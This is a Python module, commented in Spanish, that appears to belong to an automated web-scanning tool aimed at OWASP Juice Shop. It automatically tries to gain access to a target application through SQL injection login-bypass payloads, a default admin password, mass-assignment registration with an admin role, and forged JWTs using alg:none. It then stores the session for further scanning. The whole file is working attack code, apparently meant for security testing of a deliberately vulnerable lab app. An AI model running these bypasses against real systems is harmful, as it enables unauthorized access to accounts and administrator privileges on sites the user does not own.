"""
integraciones/auth_engine.py — Motor de Autenticación Automática

Intenta obtener acceso a la aplicación mediante múltiples vectores:
- SQLi login bypass
- Credenciales por defecto
- Registro de usuario + escalación
- JWT forgery
- Mass assignment en registro

Si logra acceso, almacena la sesión (cookies + token JWT) para
que los plugins puedan escanear rutas autenticadas.
"""

import json
import re
import time
from urllib.parse import urljoin
from core.logger import get_logger

logger = get_logger("auth_engine")

_PATRON_JWT = re.compile(r'(eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)')


class AuthEngine:
    """
    Motor de autenticación que prueba múltiples vectores de acceso.
    Si tiene éxito, expone cookies y token para uso en escaneo autenticado.
    """

    def __init__(self, http_client, target_url: str):
        self.http_client = http_client
        self.target_url = target_url
        self.token: str | None = None
        self.cookies: dict = {}
        self.autenticado: bool = False
        self.es_admin: bool = False
        self.user_id: int | None = None

    def intentar_acceso(self) -> bool:
        """Prueba todos los vectores de autenticación en orden."""

        if self._sql_login_bypass():
            logger.info("✅ Acceso obtenido via SQLi login bypass")
            return True

        if self._registrar_y_acceder():
            logger.info("✅ Acceso obtenido via registro de usuario")
            return True

        if self._admin_registro_mass_assignment():
            logger.info("✅ Acceso admin via mass assignment en registro")
            return True

        if self._jwt_forgery_alg_none():
            logger.info("✅ Acceso via JWT alg:none forgery")
            return True

        logger.warning("❌ No se pudo autenticar automáticamente")
        return False

    # ─── Vector 1: SQLi Login Bypass ───

    def _sql_login_bypass(self) -> bool:
        login_urls = [
            urljoin(self.target_url, "/rest/user/login"),
            urljoin(self.target_url, "/api/Users"),
            urljoin(self.target_url, "/login"),
        ]
        payloads = [
            {"email": "' OR 1=1 --", "password": "' OR 1=1 --"},
            {"email": "admin@juice-sh.op'--", "password": "test"},
            {"email": "admin@juice-sh.op", "password": "' OR 1=1 --"},
            {"email": "' UNION SELECT * FROM Users--", "password": "test"},
            {"email": "admin@juice-sh.op", "password": "12345"},
        ]

        for url in login_urls:
            for payload in payloads:
                response = self.http_client.post(url, json=payload, timeout=10)
                if response and response.status_code in (200, 201):
                    try:
                        data = response.json()
                        token = (
                            data.get("authentication", {}).get("token")
                            or data.get("token")
                            or data.get("access_token")
                        )
                        if token:
                            self.token = token
                            self.autenticado = True
                            self.es_admin = "admin" in str(data.get("data", {})).lower() or "admin" in str(data).lower()
                            self.user_id = (
                                data.get("authentication", {}).get("uid")
                                or data.get("data", {}).get("id")
                            )
                            logger.info(f"  SQLi login exitoso en {url} como {'admin' if self.es_admin else 'usuario'}")
                            return True
                    except (json.JSONDecodeError, AttributeError):
                        continue
        return False

    # ─── Vector 2: Registro normal + login ───

    def _registrar_y_acceder(self) -> bool:
        email = f"sesamo_{int(time.time())}@test.com"
        password = "Sesamo123!"

        register_url = urljoin(self.target_url, "/api/Users")
        register_payload = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": None,
            "securityAnswer": None,
        }

        response = self.http_client.post(register_url, json=register_payload, timeout=10)
        if response and response.status_code in (200, 201):
            login_url = urljoin(self.target_url, "/rest/user/login")
            login_payload = {"email": email, "password": password}
            response = self.http_client.post(login_url, json=login_payload, timeout=10)
            if response and response.status_code in (200, 201):
                try:
                    data = response.json()
                    token = (
                        data.get("authentication", {}).get("token")
                        or data.get("token")
                    )
                    if token:
                        self.token = token
                        self.autenticado = True
                        self.user_id = data.get("authentication", {}).get("uid") or data.get("data", {}).get("id")
                        logger.info(f"  Registro exitoso: {email}")
                        return True
                except (json.JSONDecodeError, AttributeError):
                    pass
        return False

    # ─── Vector 3: Registro con role=admin (Mass Assignment) ───

    def _admin_registro_mass_assignment(self) -> bool:
        email = f"sesamo_admin_{int(time.time())}@test.com"
        password = "Sesamo123!"

        register_url = urljoin(self.target_url, "/api/Users")
        for extra_field in [{"role": "admin"}, {"role": "administrator"}, {"isAdmin": True}]:
            payload = {
                "email": email,
                "password": password,
                "passwordRepeat": password,
                **extra_field,
            }
            response = self.http_client.post(register_url, json=payload, timeout=10)
            if response and response.status_code in (200, 201):
                try:
                    data = response.json()
                    user_data = data.get("data", {})
                    if user_data.get("role") == "admin" or user_data.get("isAdmin"):
                        self.autenticado = True
                        self.es_admin = True
                        self.token = user_data.get("token", "")
                        logger.info(f"  Registro admin exitoso via mass assignment")
                        return True
                except (json.JSONDecodeError, AttributeError):
                    continue
        return False

    # ─── Vector 4: JWT alg:none forgery ───

    def _jwt_forgery_alg_none(self) -> bool:
        import base64
        admin_payload = {
            "email": "admin@juice-sh.op",
            "role": "admin",
            "iss": "juice-sh.op",
        }
        header_none = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(admin_payload).encode()
        ).rstrip(b"=").decode()
        fake_token = f"{header_none}.{payload_b64}."

        # Probar token en endpoint que devuelva datos del usuario
        test_url = urljoin(self.target_url, "/rest/user/whoami")
        response = self.http_client.get(test_url, headers={"Authorization": f"Bearer {fake_token}"}, timeout=10)
        if response and response.status_code == 200:
            try:
                data = response.json()
                if data.get("email") == "admin@juice-sh.op":
                    self.token = fake_token
                    self.autenticado = True
                    self.es_admin = True
                    logger.info("  JWT alg:none forgery exitoso — acceso como admin")
                    return True
            except (json.JSONDecodeError, AttributeError):
                pass
        return False

    def obtener_headers_auth(self) -> dict:
        """Retorna headers de autenticación para usar en peticiones."""
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers
